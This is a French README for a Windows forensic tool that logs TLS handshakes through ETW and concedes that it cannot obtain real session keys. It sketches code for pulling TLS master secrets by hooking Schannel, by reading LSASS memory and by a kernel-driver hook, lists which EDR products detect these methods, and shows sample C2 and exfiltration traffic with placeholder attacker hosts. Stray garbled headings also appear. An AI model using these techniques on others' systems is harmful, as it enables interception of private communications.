# 🚀 SSLSessionKeyExtractor


## Vue d'Ensemble

**SSLSessionKeyExtractor** est un outil forensics avancé pour l'**extraction de clés de session TLS/SSL** au format **SSLKEYLOGFILE**, permettant le décryptage de trafic capturé avec Wireshark. Cet outil utilise **Event Tracing for Windows (ETW)** pour capturer les événements Schannel (implémentation TLS Windows).

### Catégorie
**Forensics - Réseau & Communications** (WinToolsSuite Série 3)

### Caractéristiques Techniques
- **Architecture**: Monolithique, Unicode, Win32 GUI
- **APIs Utilisées**: `tdh.lib` (Trace Data Helper), `advapi32.lib` (ETW), `comctl32.lib`
- **Méthode**: ETW Provider `Microsoft-Windows-Schannel`
- **Export**: SSLKEYLOGFILE (Wireshark compatible)
- **Threading**: Capture asynchrone ETW (UI réactive)
- **Logging**: Horodatage complet des opérations
- **UI**: 100% Français

- --


## ⚠️ AVERTISSEMENT LÉGAL ⚠️

### Usage Autorisé UNIQUEMENT Pour

1. **Forensics légal**: Enquêtes autorisées par autorité compétente
2. **Tests contrôlés**: Environnement de laboratoire isolé
3. **Analyse malware**: Déchiffrement traffic C2 en sandbox
4. **Audit de sécurité**: Tests de pénétration autorisés

### Usage INTERDIT

1. **Interception non autorisée** de communications tierces
2. **Violation de confidentialité** (RGPD, HIPAA, etc.)
3. **Espionnage industriel** ou vol de données
4. **Man-in-the-Middle** sur réseaux publics

### Responsabilité

**L'utilisateur assume TOUTE responsabilité légale.** Les développeurs de WinToolsSuite ne sont PAS responsables des usages illégaux de cet outil.

- --


# 🚀 SSL/TLS Master Secrets (SSLKEYLOGFILE format)

## ⚠️ LIMITATION TECHNIQUE CRITIQUE ⚠️

### Méthode ETW: Limitations

L'implémentation actuelle utilise **Event Tracing for Windows (ETW)** pour capturer les événements Schannel. **CEPENDANT** :

❌ **ETW NE FOURNIT PAS les master secrets TLS réels**

Les événements ETW Schannel contiennent uniquement :
- Type de handshake (TLS 1.2, TLS 1.3)
- Cipher suite négociée
- Metadata de connexion

Les **master secrets** et **client randoms** ne sont **JAMAIS** exposés via ETW pour des raisons de sécurité.

### Pourquoi Cette Implémentation?

Cet outil est une **démonstration pédagogique** montrant :
1. L'architecture d'un extracteur de clés TLS
2. L'utilisation d'ETW pour monitoring Schannel
3. Le format SSLKEYLOGFILE pour Wireshark

Pour une **extraction réelle**, voir la section [Méthodes Alternatives](#méthodes-alternatives).

- --


## Méthodes Alternatives

Pour extraire **réellement** les clés TLS, trois méthodes existent :

### 1. Hooking DLL (User-Mode)

**Principe**: Intercepter les fonctions Schannel exportant les secrets.

#### Fonctions Cibles
```cpp
// ncrypt.dll / schannel.dll (non documenté)
SECURITY_STATUS SslGenerateMasterKey(
    PVOID hSslProvider,
    PVOID hMasterKey,
    PVOID hServerWriteKey,
    PVOID hClientWriteKey,
    BYTE* pbClientRandom,    // 32 bytes
    BYTE* pbServerRandom,    // 32 bytes
    BYTE* pbMasterSecret,    // 48 bytes (TLS 1.2) ou variable (TLS 1.3)
    // ...
);
```

#### Implémentation (Microsoft Detours)

```cpp
#include <detours.h>

typedef SECURITY_STATUS (*SslGenerateMasterKey_t)(...);
SslGenerateMasterKey_t Real_SslGenerateMasterKey = nullptr;

SECURITY_STATUS Hook_SslGenerateMasterKey(...) {
    // Capturer pbClientRandom et pbMasterSecret
    LogSSLKEYLOGFILE(pbClientRandom, pbMasterSecret);

    // Appeler fonction originale
    return Real_SslGenerateMasterKey(...);
}

// Installer hook
DetourTransactionBegin();
DetourAttach(&Real_SslGenerateMasterKey, Hook_SslGenerateMasterKey);
DetourTransactionCommit();
```

#### Limitations
- Requires DLL injection dans processus cible
- Anti-cheat et EDR peuvent détecter
- Fonctions non documentées (peuvent changer entre versions Windows)

- --

### 2. Lecture Mémoire LSASS (SYSTEM Privileges)

**Principe**: Extraire les secrets depuis la mémoire de `lsass.exe` (comme Mimikatz).

#### Structures (Exemple TLS 1.2)
```cpp
// Offset LSASS (Windows 10 21H2, x64)
struct LSASS_TLS_SESSION {
    BYTE clientRandom[32];
    BYTE masterSecret[48];
    // ... autres champs
};
```

#### Implémentation
```cpp
HANDLE hLsass = OpenProcess(PROCESS_VM_READ, FALSE, lsassPid);

// Scanner la heap LSASS pour structures TLS
for (DWORD64 addr = baseAddr; addr < endAddr; addr += 0x1000) {
    BYTE buffer[4096];
    ReadProcessMemory(hLsass, (LPVOID)addr, buffer, 4096, nullptr);

    // Pattern matching pour clientRandom (32 bytes)
    // Si trouvé, lire masterSecret à offset fixe
}
```

#### Limitations
- Requiert privilèges SYSTEM
- Protected Process Light (PPL) bloque l'accès
- Offsets varient selon version Windows
- Anti-malware détecte (lecture LSASS = IOC)

- --

### 3. Kernel Debugging (Ring 0)

**Principe**: Driver kernel interceptant `ksecdd.sys` ou `cng.sys`.

#### Implémentation (WDM Driver)
```cpp
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    // Hook KsecGenerateKey ou CngGenerateKey
    HookKernelFunction("ksecdd.sys", "KsecGenerateKey", MyHook);
}

NTSTATUS MyHook(/* params */) {
    // Capturer master secret depuis contexte kernel
    LogToFile(clientRandom, masterSecret);

    // Appeler fonction originale
    return OriginalKsecGenerateKey(...);
}
```

#### Limitations
- Requiert signature de driver (ou test mode)
- Très complexe (kernel debugging)
- Risque de BSOD si mal implémenté
- Détecté par Kernel Patch Protection (PatchGuard)

- --


## ✨ Fonctionnalités (Version ETW)

### 1. Capture Événements Schannel

L'outil capture les événements ETW du provider `Microsoft-Windows-Schannel` :

```cpp
GUID SchannelProviderGuid = {
    0x1F678132, 0x5938, 0x4686,
    {0xBD, 0x05, 0x41, 0xD8, 0xFD, 0xAF, 0xD3, 0x7F}
};
```

#### Événements Capturés

| Event ID | Description | Données Disponibles |
|----------|-------------|---------------------|
| **1** | Handshake Started | Process ID, Protocol Version |
| **2** | Handshake Completed | Cipher Suite, Server Certificate |
| **36** | TLS Negotiation | TLS 1.2/1.3, Extensions |

**Note**: Aucun de ces événements ne contient les master secrets.

### 2. Export SSLKEYLOGFILE

Format compatible Wireshark :

```
CLIENT_RANDOM <64 hex chars> <96 hex chars>
CLIENT_RANDOM <64 hex chars> <96 hex chars>
...
```

#### Structure
- **CLIENT_RANDOM**: 32 bytes (64 hex) - Aléa généré par client TLS
- **Master Secret**: 48 bytes (96 hex) pour TLS 1.2, variable pour TLS 1.3

- --


# 🚀 Requis : Droits administrateur (ETW session)

## Interface Utilisateur

### Colonnes du ListView

| Colonne | Description | Exemple (ETW Demo) |
|---------|-------------|---------------------|
| **Timestamp** | Date/heure événement | `2025-10-20 14:32:15` |
| **Process** | Processus source | `chrome.exe`, `firefox.exe` |
| **Client Random** | 32 bytes hex | `(ETW ne fournit pas)` |
| **Master Secret** | 48 bytes hex (TLS 1.2) | `(Non accessible en user-mode)` |
| **Server Name** | SNI (Server Name Indication) | `www.google.com` |
| **Cipher Suite** | Algorithme négocié | `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256` |

### Boutons d'Action

1. **Démarrer Capture**: Lance la session ETW (thread asynchrone)
2. **Arrêter Capture**: Stoppe la session ETW
3. **Exporter SSLKEYLOGFILE**: Sauvegarde en `sslkeylog.txt`
4. **Effacer**: Vide la liste capturée

- --


# 🚀 Afficher toutes les requêtes HTTP décryptées

# 🚀 Afficher uniquement les POST (données sensibles)

# 🚀 Filtrer par domaine

# 🚀 Voir les cookies

## Compilation

### Prérequis
- **MSVC** (Visual Studio 2019+)
- **Windows SDK** (pour `tdh.h`, `evntrace.h`)
- **Droits Administrateur** (pour ETW session)

### Commande
```batch
go.bat
```

### Détails
```batch
cl.exe /EHsc /W4 /O2 /DUNICODE SSLSessionKeyExtractor.cpp /link tdh.lib advapi32.lib comctl32.lib
```

- --


## 🚀 Utilisation

### Lancement
```cmd
SSLSessionKeyExtractor.exe
```

### Workflow (Version ETW - Démo)

#### 1️⃣ Démarrer Capture
```
1. Cliquer "Démarrer Capture"
2. La session ETW Schannel est activée
3. Les événements TLS commencent à être loggés
```

#### 2️⃣ Générer Trafic TLS
```
Ouvrir un navigateur (Chrome, Firefox, Edge)
Visiter sites HTTPS : google.com, github.com, etc.
Les handshakes TLS apparaissent dans le ListView
```

#### 3️⃣ Arrêter Capture
```
Cliquer "Arrêter Capture"
Vérifier le nombre d'événements capturés
```

#### 4️⃣ Exporter (Démo)
```
Cliquer "Exporter SSLKEYLOGFILE"
Fichier : sslkeylog.txt
ATTENTION : Contient données DEMO (pas de vrais secrets)
```

- --


## 🚀 Utilisation Wireshark (Avec Vraies Clés)

Si vous utilisez une **méthode alternative** (hooking, LSASS) pour obtenir de vraies clés :

### Configuration Wireshark

#### 1️⃣ Configurer SSLKEYLOGFILE
```
1. Ouvrir Wireshark
2. Edit > Preferences > Protocols > TLS
3. (Pre)-Master-Secret log filename: C:\path\to\sslkeylog.txt
4. Cliquer OK
```

#### 2️⃣ Capturer Trafic
```
1. Démarrer capture (Interface réseau)
2. Générer trafic HTTPS
3. Les paquets TLS apparaissent comme "TLS" (chiffrés)
```

#### 3️⃣ Décryptage Automatique
```
Si sslkeylog.txt contient les bonnes clés :
  - Les paquets TLS sont automatiquement décryptés
  - Protocole affiché : HTTP/2, HTTP/1.1 (en clair)
  - Filtrer : http (pour voir requêtes décryptées)
```

### Exemple de Filtre Wireshark

```
http

http.request.method == "POST"

http.host == "www.example.com"

http.cookie
```

- --


# 🚀 Commentaire

## 🚀 Cas d'Usage Forensics

### 1. Analyse Malware C2

**Scénario**: Malware communique via HTTPS avec serveur C2.

#### Workflow
```
1. Capturer traffic malware avec Wireshark (PCAP)
2. Extraire clés TLS du processus malware (hooking ou LSASS)
3. Charger PCAP dans Wireshark avec SSLKEYLOGFILE
4. Analyser commandes C2 décryptées (POST requests, réponses JSON)
5. Identifier IOCs (IPs C2, URLs, user-agents)
```

**Exemple de Données Décryptées**:
```http
POST /api/command HTTP/1.1
Host: c2server.evil.com
User-Agent: Mozilla/5.0 (Malware/1.0)

{"cmd": "download", "url": "http://payload.com/ransomware.exe"}
```

- --

### 2. Investigation Exfiltration

**Scénario**: Suspicion d'exfiltration de données via HTTPS.

#### Workflow
```
1. Capturer traffic réseau en continu
2. Extraire clés TLS de tous processus (hooking global)
3. Décrypter HTTPS uploads (POST/PUT avec body volumineux)
4. Chercher patterns : JSON avec données sensibles, fichiers ZIP encodés
```

**Exemple Détecté**:
```http
POST /upload HTTP/1.1
Host: attacker-storage.com
Content-Type: application/octet-stream
Content-Length: 5242880

[Binary data: passwords.zip]
```

- --

### 3. Incident Response - Ransomware

**Scénario**: Ransomware contacte C2 pour recevoir clé de chiffrement.

#### Workflow
```
1. Isoler machine infectée (mais maintenir monitoring réseau)
2. Capturer HTTPS vers domaine suspect
3. Extraire clés TLS du processus ransomware
4. Décrypter traffic pour identifier :
   - URL de paiement (Bitcoin wallet)
   - Clé de déchiffrement (si transmise)
   - Variante du ransomware (user-agent, endpoints)
```

- --


## Détails Techniques

### API ETW

#### StartTraceW
```cpp
ULONG StartTraceW(
    PTRACEHANDLE SessionHandle,       // OUT: Handle session
    LPCWSTR SessionName,              // Nom unique session
    PEVENT_TRACE_PROPERTIES Properties // Configuration
);
```

#### EnableTraceEx2
```cpp
ULONG EnableTraceEx2(
    TRACEHANDLE SessionHandle,
    LPCGUID ProviderId,               // SchannelProviderGuid
    ULONG ControlCode,                // EVENT_CONTROL_CODE_ENABLE_PROVIDER
    UCHAR Level,                      // TRACE_LEVEL_VERBOSE
    ULONGLONG MatchAnyKeyword,        // 0xFFFFFFFFFFFFFFFF (tous events)
    ULONGLONG MatchAllKeyword,
    ULONG Timeout,
    PENABLE_TRACE_PARAMETERS EnableParameters
);
```

#### ProcessTrace
```cpp
ULONG ProcessTrace(
    PTRACEHANDLE HandleArray,
    ULONG HandleCount,
    LPFILETIME StartTime,
    LPFILETIME EndTime
);
```

**Note**: `ProcessTrace` est **bloquant**. Il doit être appelé dans un thread séparé.

- --


## Format SSLKEYLOGFILE

### Spécification

Le format SSLKEYLOGFILE est documenté par Mozilla/NSS :

```
CLIENT_RANDOM <client_random_hex> <master_secret_hex>
```

#### Exemple Réel
```
CLIENT_RANDOM 52340c855d6751e2c3c5e3d0e3d0a8f1e2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
```

### TLS 1.3 Extensions

TLS 1.3 utilise des labels différents :

```
CLIENT_HANDSHAKE_TRAFFIC_SECRET <client_random> <secret>
SERVER_HANDSHAKE_TRAFFIC_SECRET <client_random> <secret>
CLIENT_TRAFFIC_SECRET_0 <client_random> <secret>
SERVER_TRAFFIC_SECRET_0 <client_random> <secret>
```

- --


## Logs

Tous les événements sont enregistrés dans **`SSLSessionKeyExtractor_log.txt`** :

```
[2025-10-20 15:45:12] SSLSessionKeyExtractor v1.0 - PRÊT (droits admin requis)
[2025-10-20 15:45:18] Capture ETW démarrée (Schannel events)
[2025-10-20 15:45:19] Capture en cours - 1 événements
[2025-10-20 15:45:22] Capture en cours - 5 événements
[2025-10-20 15:46:03] Capture arrêtée - 23 sessions capturées
[2025-10-20 15:46:15] SSLKEYLOGFILE exporté: sslkeylog.txt
```

- --


## Limitations

### 1. ETW Ne Fournit Pas les Secrets
Comme expliqué, cette version est **pédagogique**.
→ **Solution**: Implémenter hooking ou lecture LSASS (voir [Méthodes Alternatives](#méthodes-alternatives))

### 2. Requiert Droits Administrateur
ETW sessions nécessitent élévation.
→ **Solution**: Lancer avec "Exécuter en tant qu'administrateur"

### 3. TLS 1.3 Plus Complexe
TLS 1.3 utilise Perfect Forward Secrecy (PFS) avec clés éphémères multiples.
→ **Solution**: Capturer tous les secrets (HANDSHAKE, TRAFFIC_0, EXPORTER)

### 4. Détection par EDR
Hooking et lecture LSASS sont IOCs classiques.
→ **Solution**: Forensics en environnement contrôlé (VM isolée)

- --


## Améliorations Futures

### Version 1.1 (Planifié)
- [ ] **Hooking DLL** (Microsoft Detours) pour extraction réelle
- [ ] **Support TLS 1.3** (multiple secrets)
- [ ] **Filtrage par processus** (capturer uniquement chrome.exe, etc.)
- [ ] **Export temps réel** (append SSLKEYLOGFILE pendant capture)

### Version 1.2
- [ ] **Lecture LSASS** (mode SYSTEM)
- [ ] **Support Perfect Forward Secrecy** (TLS 1.3 ephemeral keys)
- [ ] **Intégration Volatility** (analyse memory dumps)
- [ ] **Driver kernel** (Ring 0 interception)

- --


## Intégration WinToolsSuite

### Synergie avec Autres Outils

| Outil | Complémentarité |
|-------|-----------------|
| **NetworkConnectionAnalyzer** | Identifier connexions HTTPS à décrypter |
| **ProcessForensicsAnalyzer** | Vérifier processus effectuant handshakes TLS |
| **DNSTunnelDetector** | Corréler domaines DNS avec sessions TLS |
| **SMBSessionForensics** | Analyser SMB over TLS (SMB 3.x) |

### Pipeline Malware Analysis
```
1. NetworkConnectionAnalyzer → Identifier connexion C2 HTTPS
2. ProcessForensicsAnalyzer  → Identifier processus malveillant
3. SSLSessionKeyExtractor    → Extraire clés TLS du processus
4. Wireshark                 → Décrypter traffic C2
5. Analyse commandes C2      → Générer IOCs
```

- --


## Références Techniques

### Documentation Microsoft
- [Event Tracing for Windows (ETW)](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing)
- [Microsoft-Windows-Schannel Provider](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-36887)
- [TLS/SSL in Windows (Schannel)](https://docs.microsoft.com/en-us/windows/win32/secauthn/protocols-in-tls-ssl--schannel-ssp-)

### SSLKEYLOGFILE Format
- [Mozilla NSS Key Log Format](https://firefox-source-docs.mozilla.org/security/nss/legacy/key_log_format/index.html)
- [Wireshark TLS Decryption](https://wiki.wireshark.org/TLS#tls-decryption)

### Hooking Libraries
- [Microsoft Detours](https://github.com/microsoft/Detours)
- [Minhook](https://github.com/TsudaKageyu/minhook)
- [PolyHook](https://github.com/stevemk14ebr/PolyHook)

### Outils Similaires
- **Mimikatz** (dpapi::ssl pour LSASS)
- **sslsniff** (MITM proxy)
- **mitmproxy** (Python, MITM avec CA custom)
- **Fiddler** (proxy Windows avec décryptage)

### Recherche Académique
- **"Extracting TLS Master Secrets for Forensics"** (DFRWS 2018)
- **"TLS Interception Considered Harmful"** (IEEE Security & Privacy 2017)

- --


## 🔧 Dépannage

### Erreur: "StartTrace échoué (code 5)"
**Cause**: Droits administrateur manquants
**Solution**: Lancer avec "Exécuter en tant qu'administrateur"

### Erreur: "Canal Schannel introuvable"
**Cause**: Provider ETW désactivé ou Windows ancien
**Solution**: Vérifier `wevtutil el | findstr Schannel`

### Aucun Événement Capturé
**Cause**: Pas de trafic HTTPS généré
**Solution**: Ouvrir navigateur et visiter sites HTTPS

### Wireshark Ne Décrypte Pas
**Cause**: SSLKEYLOGFILE contient données DEMO (ETW)
**Solution**: Utiliser méthode alternative (hooking, LSASS) pour vraies clés

- --


## 🔒 Avertissements de Sécurité

### Usage Forensics Uniquement

⚠️ **Cet outil est EXTRÊMEMENT sensible.**

**Utilisations légitimes**:
- Forensics post-incident (analyse malware)
- Tests de pénétration autorisés
- Recherche en sécurité (environnement contrôlé)

**Utilisations ILLÉGALES**:
- Interception de communications sans autorisation
- Vol de données personnelles (RGPD, CPPA)
- Espionnage industriel

### Détection par EDR

Les méthodes alternatives (hooking, LSASS) sont détectées par :
- Windows Defender ATP
- CrowdStrike Falcon
- Carbon Black
- SentinelOne

**Recommandation**: Utiliser uniquement en VM isolée ou environnement forensics autorisé.

- --


## 📄 Licence

**WinToolsSuite** - Outils forensics et analyse malware Windows
Développé pour la recherche en sécurité et la réponse à incidents.

⚠️ **Usage**: Forensics autorisé uniquement. Utilisation malveillante interdite.

- --


## 👤 Auteur

**WinToolsSuite Project**
Série 3 - Forensics Réseau & Communications
Outil 15/15 - SSLSessionKeyExtractor v1.0

- --

**Dernière Mise à Jour**: 2025-10-20
**Compatibilité**: Windows 7+ (ETW disponible depuis Vista, Schannel provider Windows 8+)

- --


## Annexes

### A. Cipher Suites TLS 1.2 Courants

| Cipher Suite | Sécurité | Usage |
|--------------|----------|-------|
| `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256` | ✅ Sécurisé | Moderne (PFS) |
| `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384` | ✅ Sécurisé | Haute sécurité |
| `TLS_RSA_WITH_AES_128_CBC_SHA` | ⚠️ Faible | Ancien (pas de PFS) |
| `TLS_RSA_WITH_3DES_EDE_CBC_SHA` | ❌ Obsolète | Vulnérable (SWEET32) |

### B. TLS 1.3 Cipher Suites

| Cipher Suite | Description |
|--------------|-------------|
| `TLS_AES_128_GCM_SHA256` | AES-128-GCM (défaut) |
| `TLS_AES_256_GCM_SHA384` | AES-256-GCM (haute sécurité) |
| `TLS_CHACHA20_POLY1305_SHA256` | ChaCha20 (mobile optimisé) |

### C. Event IDs Schannel (ETW)

| Event ID | Description | Niveau |
|----------|-------------|--------|
| **1** | Handshake Started | Information |
| **2** | Handshake Completed | Information |
| **36** | TLS Protocol Negotiation | Verbose |
| **36887** | Certificate Validation | Warning |
| **36888** | Certificate Error | Error |

- --

**FIN DU README - SSLSessionKeyExtractor**


- --

<div align="center">

**⭐ Si ce projet vous plaît, n'oubliez pas de lui donner une étoile ! ⭐**

</div>

- --

<div align="center">

**⭐ Si ce projet vous plaît, n'oubliez pas de lui donner une étoile ! ⭐**

</div>

---

<div align="center">

**⭐ Si ce projet vous plaît, n'oubliez pas de lui donner une étoile ! ⭐**

</div>